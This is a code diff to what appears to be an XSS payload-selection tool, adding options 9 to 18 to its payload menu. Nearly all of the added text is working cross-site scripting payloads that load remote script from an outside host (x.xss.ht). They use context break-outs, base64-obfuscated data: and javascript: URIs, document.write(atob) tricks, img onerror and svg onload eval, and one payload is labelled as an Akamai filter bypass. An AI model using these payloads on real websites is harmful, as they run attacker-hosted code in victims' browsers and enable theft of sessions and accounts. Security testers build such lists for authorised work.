@@ -19,6 +19,26 @@ def get_payload_id_from_number( number ):
         return "xhr_payload"
     elif number == 8:
         return "getscript_payload"
+    elif number == 9:
+	return "getscript_from_js_payload"
+    elif number == 10:
+	return "js_akamai_bypass_payload"
+    elif number == 11:
+	return "js_akamai_apos_payload"
+    elif number == 12:
+	return "data_url_payload"
+    elif number == 13:
+	return "js_uri_write_payload"
+    elif number == 14:
+	return "js_write_payload"
+    elif number == 15:
+	return "js_write_apos_payload"
+    elif number == 16:
+	return "img_write_payload"
+    elif number == 17:
+	return "svg_payload"
+    elif number == 18:
+	return "textarea_payload"
     else:
         return 1
 
@@ -53,6 +73,16 @@ Please choose the payload type you'd like to use for this dummy word:
 6) "><iframe srcdoc="&#60;&#115;&#99;..">
 7) <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//x.xss.ht");a.send();</script>
 8) <script>$.getScript("//x.xss.ht")</script>
+9) ";jQuery.getScript("//x.xss.ht");//
+10) ";var a=document.createElement("script");a.setAttribute("src","//x.xss.ht");document.head.appendChild(a);//
+11) ';var a=document.createElement('script');a.setAttribute('src','//x.xss.ht');document.head.appendChild(a);//
+12) data:a;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms=
+13) javascript:document.write(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms='));
+14) ";document.write(atob("PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQZGF0YUxpbms="));//
+15) ';document.write(atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8veC54c3MuaHQiPjwvc2NyaXB0PjxzY3JpcHQ+c2V0VGltZW91dChmdW5jdGlvbigpe3dpbmRvdy5sb2NhdGlvbiA9ICJodHRwczovL3d3dy55YWhvby5jb20ifSwgNDAwMCk7PC9zY3JpcHQ+ZGF0YUxpbms='));//
+16) '>"></textarea></script><img id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veC54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 src=x onerror=eval(atob(this.id))>
+17) '>"><svg/onload=document.write(atob(this.id)) id=PHNjcmlwdD5jb25maXJtKDEpOzwvc2NyaXB0PmFz>
+18) '>"></textarea></script><script src=//x.xss.ht></script>
 
     """
     )
